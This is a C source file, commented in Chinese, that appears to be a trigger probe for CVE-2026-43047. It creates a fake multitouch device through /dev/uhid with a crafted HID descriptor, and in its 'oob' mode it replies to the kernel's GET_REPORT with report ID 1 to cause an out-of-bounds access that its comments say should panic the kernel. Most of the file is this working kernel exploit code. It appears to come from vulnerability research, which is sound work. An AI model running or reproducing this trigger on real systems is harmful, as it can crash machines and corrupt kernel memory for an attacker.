/* uhid_mt.c — CVE-2026-43047 触发探针(v2)      §CZ-2
 *
#include <dirent.h>
 * v1 教训:
 *   - 本机 uhid **不支持 UHID_CREATE2**(type 12) —— 所有尺寸都 EINVAL
 *   - 传统 CREATE(type 0) 可用, 描述符通过【用户指针】传入, write 4380 字节被接受
 *   - 内核发出的 GET_REPORT 事件 type = 13(与上游编号不同) ⇒ 回复事件的编号也必须实测
 *
 * 本版:
 *   M1 discover  传统 CREATE → 打印所有收到事件的 type 与前 16 字节
 *                → 收到疑似 GET_REPORT 时, 依次试回复 type 11/12/14/15/10,
 *                  打印各自的 write 返回(找出被接受的那个编号); 数据填 0(安全)
 *   M2 safe      用已知编号回复, data[0]=0(无效 ID, 不越界) —— 验证整条链
 *   M3 oob       用已知编号回复, data[0]=1(大输入报告 ID) —— 触发越界(预期 panic)
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/time.h>

#define EVSZ 4380
#define BIG_REPORT_ID 1

static unsigned char ev[EVSZ];
static int g_mode = 0;            /* 0=discover 1=safe 2=oob */
static int g_reply_type = -1;
static uint32_t g_req_id = 0;
static int g_get_report_seen = 0;

static void wr32(int o, uint32_t v) { memcpy(ev + o, &v, 4); }
static void wr16(int o, uint16_t v) { memcpy(ev + o, &v, 2); }
static uint32_t rd32(int o) { uint32_t v; memcpy(&v, ev + o, 4); return v; }

static unsigned char desc[] = {
    /* ★ Win8 多点触控签名: vendor page 0xFF00 / usage 0xC5 的 FEATURE */
    0x06,0x00,0xFF, 0x09,0xC5, 0xA1,0x01,
    0x15,0x00, 0x26,0xFF,0x00, 0x75,0x08, 0x95,0x01, 0xB1,0x02,
    0xC0,
    /* Digitizer / Touch Screen 应用集合 */
    0x05,0x0D, 0x09,0x04, 0xA1,0x01,
    0x09,0x55, 0x15,0x00, 0x26,0xFF,0x00, 0x75,0x08, 0x95,0x01, 0xB1,0x02,
    0x85,0x01, 0x09,0x51, 0x15,0x00, 0x26,0xFF,0x00, 0x75,0x08, 0x95,0xFF, 0x81,0x02,
    0xC0
};

/* 传统 CREATE(type 0): name@4(128) phys@132(64) uniq@196(64)
   rd_data(u64 用户指针)@260  rd_size@268  bus@270  vendor@272 product@276 version@280 country@284 */
static int create_legacy(int fd, const char *name) {
    memset(ev, 0, EVSZ);
    wr32(0, 0);
    strncpy((char *)(ev + 4), name, 127);
    strncpy((char *)(ev + 132), "virt-0", 63);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev + 260, &p, 8);
    wr16(268, (uint16_t)sizeof(desc));
    wr16(270, 0x0003);                 /* BUS_USB */
    wr32(272, 0x1234); wr32(276, 0x5678); wr32(280, 1);
    errno = 0;
    ssize_t w = write(fd, ev, EVSZ);
    printf("传统 CREATE -> ret=%zd errno=%d\n", w, errno);
    return w > 0 ? 0 : -1;
}

static void dump_head(const char *tag) {
    printf("      %s:", tag);
    for (int i = 0; i < 16; i++) printf(" %02x", ev[i]);
    printf("\n");
}

static void readfile1(const char *p, char *out, int outn) {
    int f = open(p, O_RDONLY);
    out[0] = 0;
    if (f < 0) { snprintf(out, outn, "(无)"); return; }
    int n = read(f, out, outn - 1);
    close(f);
    if (n < 0) n = 0;
    out[n] = 0;
    while (n > 0 && (out[n-1] == '\n' || out[n-1] == ' ')) out[--n] = 0;
}

/* 用 C 直接读 sysfs, 判定是 hid-multitouch 还是 hid-generic 绑定 */
static void show_input(void) {
    DIR *d = opendir("/sys/bus/hid/devices");
    printf("  /sys/bus/hid/devices:\n");
    if (!d) { printf("    opendir 失败 errno=%d\n", errno); return; }
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (de->d_name[0] == '.') continue;
        char path[512], link[512], nm[256];
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/driver", de->d_name);
        ssize_t n = readlink(path, link, sizeof(link) - 1);
        if (n < 0) n = 0; link[n] = 0;
        const char *drv = strrchr(link, '/');
        drv = drv ? drv + 1 : link;
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/name", de->d_name);
        readfile1(path, nm, sizeof(nm));
        printf("    %-30s driver=%-16s name=%s\n", de->d_name,
               n > 0 ? drv : "(未绑定)", nm);
        /* 若 hid-multitouch 绑定, mt_attribute_group 会提供 quirks / mt_slots 等 */
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/quirks", de->d_name);
        char q[128]; readfile1(path, q, sizeof(q));
        if (q[0]) printf("        quirks = %s\n", q);
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/mt_slots", de->d_name);
        readfile1(path, q, sizeof(q));
        if (q[0]) printf("        mt_slots = %s\n", q);
    }
    closedir(d);
    printf("  /sys/class/input 的名字:\n");
    DIR *di = opendir("/sys/class/input");
    if (di) {
        while ((de = readdir(di)) != NULL) {
            if (strncmp(de->d_name, "input", 5)) continue;
            char path[512], nm[256];
            snprintf(path, sizeof(path), "/sys/class/input/%s/name", de->d_name);
            readfile1(path, nm, sizeof(nm));
            printf("    %-10s %s\n", de->d_name, nm);
        }
        closedir(di);
    }
}

/* 构造并发送一个回复事件 */
static int send_reply(int fd, int type, uint32_t id, uint8_t first_byte) {
    memset(ev, 0, EVSZ);
    wr32(0, (uint32_t)type);
    wr32(4, id);          /* .id */
    wr16(8, 0);           /* .err */
    wr16(10, 1);          /* .size */
    ev[12] = first_byte;  /* .data[0] */
    errno = 0;
    ssize_t w = write(fd, ev, EVSZ);
    printf("      回复 type=%-3d -> ret=%-4zd errno=%d%s\n", type, w, errno,
           w > 0 ? "  ★ 被接受" : "");
    return w > 0 ? 0 : -1;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    const char *m = (argc > 1) ? argv[1] : "discover";
    g_mode = strcmp(m, "oob") == 0 ? 2 : (strcmp(m, "safe") == 0 ? 1 : 0);
    if (argc > 2) g_reply_type = atoi(argv[2]);

    printf("=== uhid_mt v2  模式=%s  回复编号=%d ===\n", m, g_reply_type);
    printf("描述符 %zu 字节\n", sizeof(desc));

    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open /dev/uhid 失败 errno=%d\n", errno); return 1; }
    printf("open ok fd=%d\n", fd);
    show_input();
    if (create_legacy(fd, "uhid_mt") < 0) return 1;

    int disc_seq = 0;
    static const int cand[] = { 11, 12, 14, 15, 10, 13 };
    struct timeval t0; gettimeofday(&t0, NULL);

    printf("\n进入事件循环(最多 15 秒)...\n");
    for (;;) {
        struct timeval now; gettimeofday(&now, NULL);
        if (now.tv_sec - t0.tv_sec > 15) { printf("  [15s 超时]\n"); break; }
        struct timeval tv = { 1, 0 };
        fd_set rf; FD_ZERO(&rf); FD_SET(fd, &rf);
        int s = select(fd + 1, &rf, NULL, NULL, &tv);
        if (s <= 0) continue;
        ssize_t r = read(fd, ev, EVSZ);
        if (r <= 0) { printf("  read=%zd errno=%d\n", r, errno); continue; }
        uint32_t type = rd32(0);
        printf("  <事件 type=%u  (len=%zd)>\n", type, r);
        dump_head("head");

        /* 判定"疑似 GET_REPORT": 载荷在 +8/+9 处是 rnum/rtype(1..3), 且 +10 处 size 合理 */
        int looks_get = (ev[8] <= 3) && (ev[9] >= 1 && ev[9] <= 3);
        if (looks_get || type == 13 || type == 10) {
            printf("      ⇒ 判定为 GET_REPORT(内核请求报告)  ★ mt_feature_mapping→mt_get_feature 已执行\n");
            g_get_report_seen = 1;
            g_req_id = rd32(4);

            if (g_mode == 0) {
                /* 发现模式: 依次试候选编号, 找出被接受的那个 */
                if (disc_seq < (int)(sizeof(cand)/sizeof(cand[0]))) {
                    send_reply(fd, cand[disc_seq], g_req_id, 0);
                    disc_seq++;
                }
            } else {
                int rt = (g_reply_type > 0) ? g_reply_type : 11;
                uint8_t fb = (g_mode == 2) ? BIG_REPORT_ID : 0;
                printf("      模式=%s, 首字节=%u\n", (g_mode == 2) ? "oob" : "safe", fb);
                send_reply(fd, rt, g_req_id, fb);
            }
            if (g_mode != 0) { printf("  [已回复, 结束]\n"); break; }
        }
    }

    show_input();
    printf("\n=== 结束, 进程存活 ===\n");
    close(fd);
    return 0;
}
